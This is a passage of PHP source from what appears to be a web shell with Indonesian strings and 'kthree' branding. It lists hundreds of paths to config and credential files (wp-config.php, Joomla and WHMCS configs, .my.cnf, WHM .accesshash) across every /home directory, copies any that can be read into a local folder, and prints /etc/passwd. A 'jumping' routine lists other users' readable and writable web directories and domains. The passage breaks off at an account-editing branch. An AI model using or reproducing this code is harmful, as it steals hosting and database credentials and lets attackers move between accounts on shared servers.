					"/home/$user_kthree/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_kthree/public_html/forum/config.php" => "phpBB",
					"/home/$user_kthree/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_kthree/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_kthree/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_kthree/public_html/admin/config.php" => "OpenCart",
					"/home/$user_kthree/public_html/slconfig.php" => "Sitelok",
					"/home/$user_kthree/public_html/application/config/database.php" => "Ellislab",					
					"/home/$user_kthree/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_kthree/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home/$user_kthree/public_html/central/configuration.php" => "WHM Central",
					"/home/$user_kthree/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home/$user_kthree/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home/$user_kthree/public_html/submitticket.php" => "WHMCS",										
					"/home/$user_kthree/public_html/configuration.php" => "Joomla",					
					"/home/$user_kthree/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_kthree/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_kthree/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home/$user_kthree/public_html/Home/configuration.php" => "JoomlaHome",
					"/home/$user_kthree/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home/$user_kthree/public_html/home/configuration.php" => "JoomlaHome",
					"/home/$user_kthree/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home/$user_kthree/public_html/New/configuration.php" => "JoomlaNew",
					"/home/$user_kthree/public_html/new/configuration.php" => "JoomlaNew",
					"/home/$user_kthree/public_html/News/configuration.php" => "JoomlaNews",
					"/home/$user_kthree/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home/$user_kthree/public_html/news/configuration.php" => "JoomlaNews",
					"/home/$user_kthree/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home/$user_kthree/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home/$user_kthree/public_html/cms/configuration.php" => "JoomlaCms",
					"/home/$user_kthree/public_html/Main/configuration.php" => "JoomlaMain",
					"/home/$user_kthree/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home/$user_kthree/public_html/main/configuration.php" => "JoomlaMain",
					"/home/$user_kthree/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home/$user_kthree/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home/$user_kthree/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home/$user_kthree/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_kthree/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home/$user_kthree/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_kthree/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home/$user_kthree/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home/$user_kthree/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home/$user_kthree/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home/$user_kthree/public_html/Press/configuration.php" => "JoomlaPress",
					"/home/$user_kthree/public_html/press/configuration.php" => "JoomlaPress",
					"/home/$user_kthree/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home/$user_kthree/public_html/wp/configuration.php" => "JoomlaWp",
					"/home/$user_kthree/public_html/WP/configuration.php" => "JoomlaWP",
					"/home/$user_kthree/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home/$user_kthree/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home/$user_kthree/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home/$user_kthree/public_html/wp-config.php" => "WordPress",
					"/home/$user_kthree/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_kthree/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_kthree/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home/$user_kthree/public_html/Home/wp-config.php" => "WordPressHome",
					"/home/$user_kthree/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home/$user_kthree/public_html/home/wp-config.php" => "WordPressHome",
					"/home/$user_kthree/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home/$user_kthree/public_html/New/wp-config.php" => "WordPressNew",
					"/home/$user_kthree/public_html/new/wp-config.php" => "WordPressNew",
					"/home/$user_kthree/public_html/News/wp-config.php" => "WordPressNews",
					"/home/$user_kthree/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home/$user_kthree/public_html/news/wp-config.php" => "WordPressNews",
					"/home/$user_kthree/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home/$user_kthree/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home/$user_kthree/public_html/cms/wp-config.php" => "WordPressCms",
					"/home/$user_kthree/public_html/Main/wp-config.php" => "WordPressMain",
					"/home/$user_kthree/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home/$user_kthree/public_html/main/wp-config.php" => "WordPressMain",
					"/home/$user_kthree/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home/$user_kthree/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home/$user_kthree/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home/$user_kthree/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_kthree/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home/$user_kthree/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_kthree/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home/$user_kthree/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home/$user_kthree/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home/$user_kthree/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home/$user_kthree/public_html/Press/wp-config.php" => "WordPressPress",
					"/home/$user_kthree/public_html/press/wp-config.php" => "WordPressPress",
					"/home/$user_kthree/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home/$user_kthree/public_html/wp/wp-config.php" => "WordPressWp",
					"/home/$user_kthree/public_html/WP/wp-config.php" => "WordPressWP",
					"/home/$user_kthree/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home/$user_kthree/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home/$user_kthree/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home1/$user_kthree/.my.cnf" => "cpanel",
					"/home1/$user_kthree/.accesshash" => "WHM-accesshash",
					"/home1/$user_kthree/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_kthree/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_kthree/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_kthree/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home1/$user_kthree/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_kthree/public_html/forum/config.php" => "phpBB",
					"/home1/$user_kthree/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_kthree/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_kthree/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_kthree/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_kthree/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_kthree/public_html/application/config/database.php" => "Ellislab",					
					"/home1/$user_kthree/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_kthree/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home1/$user_kthree/public_html/central/configuration.php" => "WHM Central",
					"/home1/$user_kthree/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home1/$user_kthree/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_kthree/public_html/submitticket.php" => "WHMCS",										
					"/home1/$user_kthree/public_html/configuration.php" => "Joomla",					
					"/home1/$user_kthree/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_kthree/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_kthree/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home1/$user_kthree/public_html/Home/configuration.php" => "JoomlaHome",
					"/home1/$user_kthree/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home1/$user_kthree/public_html/home/configuration.php" => "JoomlaHome",
					"/home1/$user_kthree/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home1/$user_kthree/public_html/New/configuration.php" => "JoomlaNew",
					"/home1/$user_kthree/public_html/new/configuration.php" => "JoomlaNew",
					"/home1/$user_kthree/public_html/News/configuration.php" => "JoomlaNews",
					"/home1/$user_kthree/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home1/$user_kthree/public_html/news/configuration.php" => "JoomlaNews",
					"/home1/$user_kthree/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home1/$user_kthree/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home1/$user_kthree/public_html/cms/configuration.php" => "JoomlaCms",
					"/home1/$user_kthree/public_html/Main/configuration.php" => "JoomlaMain",
					"/home1/$user_kthree/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home1/$user_kthree/public_html/main/configuration.php" => "JoomlaMain",
					"/home1/$user_kthree/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_kthree/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home1/$user_kthree/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_kthree/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_kthree/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home1/$user_kthree/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_kthree/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_kthree/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_kthree/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home1/$user_kthree/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home1/$user_kthree/public_html/Press/configuration.php" => "JoomlaPress",
					"/home1/$user_kthree/public_html/press/configuration.php" => "JoomlaPress",
					"/home1/$user_kthree/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home1/$user_kthree/public_html/wp/configuration.php" => "JoomlaWp",
					"/home1/$user_kthree/public_html/WP/configuration.php" => "JoomlaWP",
					"/home1/$user_kthree/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_kthree/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home1/$user_kthree/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home1/$user_kthree/public_html/wp-config.php" => "WordPress",
					"/home1/$user_kthree/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_kthree/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_kthree/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home1/$user_kthree/public_html/Home/wp-config.php" => "WordPressHome",
					"/home1/$user_kthree/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home1/$user_kthree/public_html/home/wp-config.php" => "WordPressHome",
					"/home1/$user_kthree/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home1/$user_kthree/public_html/New/wp-config.php" => "WordPressNew",
					"/home1/$user_kthree/public_html/new/wp-config.php" => "WordPressNew",
					"/home1/$user_kthree/public_html/News/wp-config.php" => "WordPressNews",
					"/home1/$user_kthree/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home1/$user_kthree/public_html/news/wp-config.php" => "WordPressNews",
					"/home1/$user_kthree/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home1/$user_kthree/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home1/$user_kthree/public_html/cms/wp-config.php" => "WordPressCms",
					"/home1/$user_kthree/public_html/Main/wp-config.php" => "WordPressMain",
					"/home1/$user_kthree/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home1/$user_kthree/public_html/main/wp-config.php" => "WordPressMain",
					"/home1/$user_kthree/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_kthree/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home1/$user_kthree/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_kthree/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_kthree/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home1/$user_kthree/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_kthree/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_kthree/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_kthree/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home1/$user_kthree/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home1/$user_kthree/public_html/Press/wp-config.php" => "WordPressPress",
					"/home1/$user_kthree/public_html/press/wp-config.php" => "WordPressPress",
					"/home1/$user_kthree/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home1/$user_kthree/public_html/wp/wp-config.php" => "WordPressWp",
					"/home1/$user_kthree/public_html/WP/wp-config.php" => "WordPressWP",
					"/home1/$user_kthree/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_kthree/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home1/$user_kthree/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home2/$user_kthree/.my.cnf" => "cpanel",
					"/home2/$user_kthree/.accesshash" => "WHM-accesshash",
					"/home2/$user_kthree/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_kthree/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_kthree/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_kthree/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home2/$user_kthree/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_kthree/public_html/forum/config.php" => "phpBB",
					"/home2/$user_kthree/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_kthree/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_kthree/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_kthree/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_kthree/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_kthree/public_html/application/config/database.php" => "Ellislab",					
					"/home2/$user_kthree/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_kthree/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home2/$user_kthree/public_html/central/configuration.php" => "WHM Central",
					"/home2/$user_kthree/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home2/$user_kthree/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_kthree/public_html/submitticket.php" => "WHMCS",										
					"/home2/$user_kthree/public_html/configuration.php" => "Joomla",					
					"/home2/$user_kthree/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_kthree/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_kthree/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home2/$user_kthree/public_html/Home/configuration.php" => "JoomlaHome",
					"/home2/$user_kthree/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home2/$user_kthree/public_html/home/configuration.php" => "JoomlaHome",
					"/home2/$user_kthree/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home2/$user_kthree/public_html/New/configuration.php" => "JoomlaNew",
					"/home2/$user_kthree/public_html/new/configuration.php" => "JoomlaNew",
					"/home2/$user_kthree/public_html/News/configuration.php" => "JoomlaNews",
					"/home2/$user_kthree/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home2/$user_kthree/public_html/news/configuration.php" => "JoomlaNews",
					"/home2/$user_kthree/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home2/$user_kthree/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home2/$user_kthree/public_html/cms/configuration.php" => "JoomlaCms",
					"/home2/$user_kthree/public_html/Main/configuration.php" => "JoomlaMain",
					"/home2/$user_kthree/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home2/$user_kthree/public_html/main/configuration.php" => "JoomlaMain",
					"/home2/$user_kthree/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_kthree/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home2/$user_kthree/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_kthree/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_kthree/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home2/$user_kthree/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_kthree/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_kthree/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_kthree/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home2/$user_kthree/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home2/$user_kthree/public_html/Press/configuration.php" => "JoomlaPress",
					"/home2/$user_kthree/public_html/press/configuration.php" => "JoomlaPress",
					"/home2/$user_kthree/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home2/$user_kthree/public_html/wp/configuration.php" => "JoomlaWp",
					"/home2/$user_kthree/public_html/WP/configuration.php" => "JoomlaWP",
					"/home2/$user_kthree/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home2/$user_kthree/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home2/$user_kthree/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home2/$user_kthree/public_html/wp-config.php" => "WordPress",
					"/home2/$user_kthree/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_kthree/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_kthree/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home2/$user_kthree/public_html/Home/wp-config.php" => "WordPressHome",
					"/home2/$user_kthree/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home2/$user_kthree/public_html/home/wp-config.php" => "WordPressHome",
					"/home2/$user_kthree/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home2/$user_kthree/public_html/New/wp-config.php" => "WordPressNew",
					"/home2/$user_kthree/public_html/new/wp-config.php" => "WordPressNew",
					"/home2/$user_kthree/public_html/News/wp-config.php" => "WordPressNews",
					"/home2/$user_kthree/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home2/$user_kthree/public_html/news/wp-config.php" => "WordPressNews",
					"/home2/$user_kthree/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home2/$user_kthree/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home2/$user_kthree/public_html/cms/wp-config.php" => "WordPressCms",
					"/home2/$user_kthree/public_html/Main/wp-config.php" => "WordPressMain",
					"/home2/$user_kthree/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home2/$user_kthree/public_html/main/wp-config.php" => "WordPressMain",
					"/home2/$user_kthree/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_kthree/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home2/$user_kthree/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_kthree/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_kthree/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home2/$user_kthree/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_kthree/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_kthree/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_kthree/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home2/$user_kthree/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home2/$user_kthree/public_html/Press/wp-config.php" => "WordPressPress",
					"/home2/$user_kthree/public_html/press/wp-config.php" => "WordPressPress",
					"/home2/$user_kthree/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home2/$user_kthree/public_html/wp/wp-config.php" => "WordPressWp",
					"/home2/$user_kthree/public_html/WP/wp-config.php" => "WordPressWP",
					"/home2/$user_kthree/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_kthree/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home2/$user_kthree/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_kthree/.my.cnf" => "cpanel",
					"/home3/$user_kthree/.accesshash" => "WHM-accesshash",
					"/home3/$user_kthree/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_kthree/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_kthree/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_kthree/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home3/$user_kthree/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_kthree/public_html/forum/config.php" => "phpBB",
					"/home3/$user_kthree/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_kthree/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_kthree/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_kthree/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_kthree/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_kthree/public_html/application/config/database.php" => "Ellislab",					
					"/home3/$user_kthree/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_kthree/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home3/$user_kthree/public_html/central/configuration.php" => "WHM Central",
					"/home3/$user_kthree/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home3/$user_kthree/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_kthree/public_html/submitticket.php" => "WHMCS",										
					"/home3/$user_kthree/public_html/configuration.php" => "Joomla",					
					"/home3/$user_kthree/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_kthree/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_kthree/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home3/$user_kthree/public_html/Home/configuration.php" => "JoomlaHome",
					"/home3/$user_kthree/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home3/$user_kthree/public_html/home/configuration.php" => "JoomlaHome",
					"/home3/$user_kthree/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home3/$user_kthree/public_html/New/configuration.php" => "JoomlaNew",
					"/home3/$user_kthree/public_html/new/configuration.php" => "JoomlaNew",
					"/home3/$user_kthree/public_html/News/configuration.php" => "JoomlaNews",
					"/home3/$user_kthree/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home3/$user_kthree/public_html/news/configuration.php" => "JoomlaNews",
					"/home3/$user_kthree/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home3/$user_kthree/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home3/$user_kthree/public_html/cms/configuration.php" => "JoomlaCms",
					"/home3/$user_kthree/public_html/Main/configuration.php" => "JoomlaMain",
					"/home3/$user_kthree/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home3/$user_kthree/public_html/main/configuration.php" => "JoomlaMain",
					"/home3/$user_kthree/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_kthree/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home3/$user_kthree/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_kthree/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_kthree/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home3/$user_kthree/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_kthree/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_kthree/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_kthree/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home3/$user_kthree/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home3/$user_kthree/public_html/Press/configuration.php" => "JoomlaPress",
					"/home3/$user_kthree/public_html/press/configuration.php" => "JoomlaPress",
					"/home3/$user_kthree/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home3/$user_kthree/public_html/wp/configuration.php" => "JoomlaWp",
					"/home3/$user_kthree/public_html/WP/configuration.php" => "JoomlaWP",
					"/home3/$user_kthree/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home3/$user_kthree/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home3/$user_kthree/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home3/$user_kthree/public_html/wp-config.php" => "WordPress",
					"/home3/$user_kthree/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_kthree/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_kthree/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home3/$user_kthree/public_html/Home/wp-config.php" => "WordPressHome",
					"/home3/$user_kthree/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home3/$user_kthree/public_html/home/wp-config.php" => "WordPressHome",
					"/home3/$user_kthree/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home3/$user_kthree/public_html/New/wp-config.php" => "WordPressNew",
					"/home3/$user_kthree/public_html/new/wp-config.php" => "WordPressNew",
					"/home3/$user_kthree/public_html/News/wp-config.php" => "WordPressNews",
					"/home3/$user_kthree/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home3/$user_kthree/public_html/news/wp-config.php" => "WordPressNews",
					"/home3/$user_kthree/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home3/$user_kthree/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home3/$user_kthree/public_html/cms/wp-config.php" => "WordPressCms",
					"/home3/$user_kthree/public_html/Main/wp-config.php" => "WordPressMain",
					"/home3/$user_kthree/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home3/$user_kthree/public_html/main/wp-config.php" => "WordPressMain",
					"/home3/$user_kthree/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_kthree/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home3/$user_kthree/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_kthree/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_kthree/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home3/$user_kthree/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_kthree/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_kthree/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_kthree/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home3/$user_kthree/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home3/$user_kthree/public_html/Press/wp-config.php" => "WordPressPress",
					"/home3/$user_kthree/public_html/press/wp-config.php" => "WordPressPress",
					"/home3/$user_kthree/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home3/$user_kthree/public_html/wp/wp-config.php" => "WordPressWp",
					"/home3/$user_kthree/public_html/WP/wp-config.php" => "WordPressWP",
					"/home3/$user_kthree/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_kthree/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home3/$user_kthree/public_html/Portal/wp-config.php" => "WordPressPortal"					
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("kthree_config/$user_kthree-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/kthree_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&k3=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
} elseif($_GET['k3'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_idx_jump) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['k3'] == 'auto_edit_user') {
	if($_POST['hajar']) {
